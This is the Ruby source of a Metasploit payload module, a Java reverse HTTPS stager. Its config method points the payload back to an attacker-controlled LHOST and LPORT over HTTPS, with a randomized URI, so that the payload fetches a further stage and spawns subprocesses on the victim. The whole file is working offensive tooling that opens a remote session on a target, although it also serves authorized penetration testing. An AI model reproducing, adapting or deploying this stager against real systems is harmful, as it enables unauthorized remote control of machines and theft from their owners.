##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/uuid/options'

module MetasploitModule

  CachedSize = 5932

  include Msf::Payload::Stager
  include Msf::Payload::Java
  include Msf::Payload::UUID::Options

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Java Reverse HTTPS Stager',
      'Description'   => 'Tunnel communication over HTTPS',
      'Author'        => [
          'mihi',  # all the hard work
          'egypt', # msf integration
          'hdm',   # windows/reverse_https
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'java',
      'Arch'          => ARCH_JAVA,
      'Handler'       => Msf::Handler::ReverseHttps,
      'Convention'    => 'javaurl',
      'Stager'        => {'Payload' => ""}
      ))

    register_advanced_options(
      [
        Msf::OptInt.new('Spawn', [ true, "Number of subprocesses to spawn", 2 ])
      ], self.class
    )

    @class_files = [
      [ "metasploit", "PayloadTrustManager.class" ],
    ]
  end

  def config
    # Default URL length is 30-256 bytes
    uri_req_len = 30 + rand(256-30)

    # Generate the short default URL if we don't know available space
    if self.available_space.nil?
      uri_req_len = 5
    end

    spawn = datastore["Spawn"] || 2
    c =  ""
    c << "Spawn=#{spawn}\n"
    c << "URL=https://#{datastore["LHOST"]}"
    c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
    c << "#{luri}"
    c << generate_uri_uuid_mode(:init_java, uri_req_len)
    c << "\n"

    c
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end
